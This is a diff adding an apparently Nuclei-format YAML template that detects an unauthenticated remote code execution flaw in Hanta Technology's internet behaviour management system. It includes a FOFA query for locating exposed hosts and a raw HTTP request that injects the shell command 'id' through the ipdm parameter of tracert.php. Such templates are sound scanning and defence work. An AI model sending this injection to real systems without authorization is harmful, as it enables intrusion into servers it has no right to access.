@@ -1,0 +1,29 @@
+id: hanta-shangwangxingwei-trace-rce
+
+info:
+  name: hanta-shangwangxingwei-trace-rce
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: title="汉塔科技 - 上网行为管理系统"
+    上海汉塔网络科技有限公司上网行为管理系统 /dgn/dgn_tools/tracert.php 接口处存在远程代码执行漏洞，未经身份验证的攻击者可通过该漏洞获取服务器权限。经过分析和研判，该漏洞利用难度低，可导致远程代码执行，建议尽快修复。
+  reference:
+    - 
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        GET /dgn/dgn_tools/tracert.php?ipdm=2;id; HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+        Connection: keep-alive
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip, deflate, br
+
+    matchers:
+      - type: dsl
+        name: rce
+        dsl:
+          - "status_code == 200 && contains(body,'uid=')"
